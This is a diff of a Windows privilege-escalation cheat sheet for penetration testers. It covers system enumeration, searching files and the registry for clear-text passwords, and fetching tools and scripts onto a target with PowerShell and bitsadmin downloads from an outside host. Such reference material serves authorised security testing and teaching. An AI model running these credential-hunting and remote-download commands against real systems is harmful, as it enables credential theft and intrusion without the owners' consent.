@@ -7,20 +7,29 @@ This document is meant for pen-testers, red teams, and the like.
 
 ** Needless to state: You're responosible for what you're doing :-)
 
+
+
 # Notes & Format
 - commands should be copiable from the boxes; windows inline command comments are noted as `command &:: comment`, so it still should work without messing your easy copy-paste style commands. Think of it as the hash # in Linux.
-- if two commands are required to run it's better to combine them into one line using the `&` delimiter 
+- if two commands are required to run it's better to combine them into one line using the `&` delimiter
+- if a command is an alternative to another; use the `||` delimiter so when command1 fails the second gets executed.
+
+
 
 # Contributors
 - AK | Author and Maintainer [amAK.xyz](https://imAK.xyz), [@xxByte](https://twitter.com/xxByte)
-- You | Your Contribution [yourTwitter](https://twitter.com/xxByte)
+
 
 ------
+
 Let's get to it!
+
+
 
 # OS Enumurations
 In this stage you want to learn as much as possible about the operating system.
 Note any odd things and investigate them until you hit a dead-end, then do the next thing.
+
 
 ## Windows Version and Configuration
 What Windows is it, what version?
@@ -29,18 +38,21 @@ What Windows is it, what version?
 
 What architecture? x86 or x64?
 
-    wmic os get osarchitecture
-    echo %PROCESSOR_ARCHITECTURE%
+    wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 
 List all env variables
 
     set
-    
+
+List all drives
+
+    wmic logicaldisk get caption || fsutil fsinfo drives
+
+
 ## Users Enumuration
 Get current username
 
-    echo %USERNAME%
-    whoami
+    echo %USERNAME% || whoami
 
 List all users 
 
@@ -94,8 +106,11 @@ List all network shares
 
     net share
 
+
+
 # Looting any clear text passwords
 Many admins will store clear-text passwords on the file system. Your target is usually xml, txt, xls files that have the word pass/password on them.
+
 
 ## Searching in files
 Quick peek into common password files
@@ -115,6 +130,7 @@ Search for file contents
 Search for a file with a certain filename
 
     dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+
 
 ## Searching in Registery
 Search the registery for key names
@@ -152,16 +168,17 @@ Do you have powershell magic?
 In this section you will have the basic binaries to make your life a bit easier such as zip, unzip, wget, and the rest.
 These tools are meant to be used for local exploits or get other privilege-escalation scripts to do deeper scanning for you.
 
-## Unzip files
+
+## (De)compressing files
 Download the unzip binary for windows from [here](http://gnuwin32.sourceforge.net/packages/unzip.htm)
 Unzip it in your attacker host then serve /bin/unzip.exe via an http server to your target host
 
     unzip.exe -h &::#usage
     unzip.exe file.zip &::#extract
 
-## To zip files 
-same as above, the only difference is the binaries, you can get them [here](http://gnuwin32.sourceforge.net/packages/zip.htm)
-zip also has a dependency file called bzip2.dll, which has to be in the same folder.
+
+For compression (or zip) follow the same steps as above, the only difference is the binaries, you can get them [here](http://gnuwin32.sourceforge.net/packages/zip.htm)
+zip has also a dependency file called bzip2.dll, which has to be in the same folder and can also be downloaded from the same link ^
 Once you have the binary and dependency dll on you can run:
 
     zip -h &::#for usage
@@ -170,15 +187,17 @@ Once you have the binary and dependency dll on you can run:
     zip -e -P PASSWORD_HERE -9 out.zip file1.txt file2.xls file3.jpg &::#for encryption with a password 
     zip -e -P PASSWORD_HERE -9 -r c:\some\directory &::#same as above but for directories.
 
-## wget using PowerShell
+
+## Uploading / Downloading files 
+a wget using powershell
 
     powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs-scripts.zip -UseBasicParsing -OutFile %TEMP%\scripts.zip"
 
-## wget using bitsadmin (when powershell is not present)
+wget using bitsadmin (when powershell is not present)
 
     cmd /c "bitsadmin /transfer myjob /download /priority high https://addaxsoft.com/downloadR/wpecs-scripts.zip %TEMP%\scripts.zip"
 
-## wget via command shortcut
+wget via command shortcut
 use `wget link`
 
     doskey wget="cmd /c bitsadmin /transfer myjob /download /priority high $1 %TEMP%\scripts.zip"
@@ -189,6 +208,8 @@ or using powershell; note: this might be broken at the moment
     doskey wget="powershell -Noninteractive -NoProfile -command wget $1 -UseBasicParsing -OutFile %TEMP%\scripts.zip"
     wget https://addaxsoft.com/downloadR/wpecs-scripts.zip
 
+
+	
 # Abusing Weak Services
 this is the section where "shit gets real"
 If you have no powershell skip the first part of this section and go to the manual way
